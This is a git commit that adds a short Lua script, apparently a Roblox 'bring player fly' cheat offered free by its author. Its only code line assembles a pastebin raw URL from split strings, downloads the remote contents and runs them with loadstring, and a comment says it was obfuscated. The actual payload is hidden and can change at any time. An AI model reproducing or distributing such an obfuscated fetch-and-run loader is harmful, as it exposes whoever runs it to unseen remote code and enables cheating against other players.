7aab191c5a14f9a8c76c340ca046ff9336ef0369
Darkluax-main-account <pradezjj@gmail.com>
2026-04-16 11:41:55 +0800

    Create Bringplayerfly.lua

---
+++ Bringplayerfly.lua
@@ -0,0 +1,4 @@
+local _="https://pastebin"local __=".com/raw/"local ___="1z4hMhjD"(loadstring or load)(game:HttpGet(_..__..___))()
+
+-- // obfuscated by monsy obfuscator
+-- // New Darkluax's github channel use this bring player fly script for free :)
